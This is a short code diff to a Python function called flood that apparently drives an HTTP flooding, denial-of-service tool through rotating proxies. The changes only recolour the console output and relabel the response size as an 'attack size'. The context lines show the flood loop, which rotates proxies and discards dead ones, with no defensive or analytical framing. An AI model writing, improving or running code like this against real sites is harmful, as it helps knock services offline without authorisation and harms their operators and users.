@@ -83,11 +83,12 @@ def flood(target: str) -> None:
         status = (
             f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
         )
-        payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
-        proxy_addr = f"| {F.RESET}Proxy: {F.CYAN}{proxy['http']:>21}"
-        print(f"{status}{F.RESET} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
+        payload_size = f"{F.GREEN} Cyber People Attack Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
+        proxy_addr = f"| {F.YELLOW}Proxy: {F.CYAN}{proxy['http']:>21}"
+        print(f"{status}{F.MAGENTA} --> {payload_size} {F.RESET}{proxy_addr}{F.RESET}")
         if not response.status_code:
             try:
                 proxies.remove(proxy)
             except ValueError:
                 proxies = get_http_proxies()
+    
